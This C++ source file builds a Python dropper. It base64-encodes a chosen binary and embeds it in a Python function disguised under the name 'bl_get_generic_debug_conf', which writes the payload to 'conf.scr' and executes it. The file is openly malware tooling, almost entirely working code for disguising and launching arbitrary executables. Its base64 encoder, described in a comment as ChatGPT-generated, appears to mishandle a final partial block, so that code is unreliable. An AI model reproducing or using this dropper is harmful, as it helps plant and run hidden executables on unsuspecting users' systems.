#include <iostream>
#include <vector>
#include <string>
#include <fstream>

/*
    Convert an std::vector<char> of data to an std::string representing it in base64
    ChatGPT generated this code, could be stolen from some git repo, who knows!
*/
std::string base64Encode(const std::vector<char>& data)
{
    // The base64 alphabet to use for encoding
    const std::string base64_alphabet =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    // Convert the input data to base64 by iterating over the input data in
    // blocks of 3 bytes and encoding each block to 4 base64 characters.

    // The base64 representation of the input data
    std::string result;

    // The number of input bytes that have been processed so far
    size_t num_processed_bytes = 0;

    // Process the input data in blocks of 3 bytes
    while (num_processed_bytes < data.size())
    {
        // The current block of 3 input bytes that are being processed
        uint32_t block = 0;

        // Read the next 3 input bytes (or fewer if there are not enough input
        // bytes remaining) and store them in the current block
        for (size_t i = 0; i < 3; ++i)
        {
            // Check if there are more input bytes available
            if (num_processed_bytes < data.size())
            {
                // Get the next input byte
                uint8_t byte = data[num_processed_bytes];

                // Shift the current block to the left by 8 bits, then add the
                // current input byte to the least significant bits of the
                // current block
                block = (block << 8) | byte;

                // Increment the number of processed input bytes
                ++num_processed_bytes;
            }
        }

        // Encode the current block of 3 input bytes to 4 base64 characters
        result += base64_alphabet[(block >> 18) & 0x3F];
        result += base64_alphabet[(block >> 12) & 0x3F];
        result += base64_alphabet[(block >> 6) & 0x3F];
        result += base64_alphabet[(block >> 0) & 0x3F];
    }

    // Add padding characters to the base64 representation if necessary
    if (data.size() % 3 == 1)
    {
        result[result.size() - 1] = '=';
        result[result.size() - 2] = '=';
    }
    else if (data.size() % 3 == 2)
    {
        result[result.size() - 1] = '=';
    }

    return result;
}


std::string generatePyDropper(std::string path) {
    std::ifstream inFile(path, std::ios::binary);
    if (inFile.is_open()) {
        std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        std::string b64Data = base64Encode(buffer);
        buffer.clear();
        std::string pyCode;
        pyCode += "def bl_get_generic_debug_conf():\n";
        pyCode += "    import base64\n";
        pyCode += "    import subprocess\n";
        pyCode += "    b = b'" + b64Data + "'\n";
        pyCode += "    d = base64.b64decode(b)\n";
        pyCode += "    with open('conf.scr', 'wb') as f:\n";
        pyCode += "        f.write(d)\n";
        pyCode += "    subprocess.Popen('conf.scr')\n";
        pyCode += "bl_get_generic_debug_conf()\n";
        return pyCode;
    }
    return "ERR_READING_EXEC";
}